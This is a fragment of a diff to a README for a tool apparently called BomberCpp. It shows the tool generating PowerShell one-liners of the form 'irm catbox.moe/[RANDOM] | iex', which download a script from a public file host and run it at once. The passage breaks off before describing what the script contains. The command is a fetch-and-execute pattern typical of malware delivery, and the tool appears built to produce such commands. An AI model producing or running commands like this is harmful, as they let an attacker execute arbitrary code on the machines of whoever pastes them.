@@ -101,8 +101,8 @@ BomberCpp/
 ## Generated Command Examples
 
 The tool creates commands in this format:
-```
-powershell "irm catbox.moe/[RANDOM].ps1 | iex"
+``
+powershell "irm catbox.moe/[RANDOM] | iex"
 ```
 
 Where the PowerShell script contains:
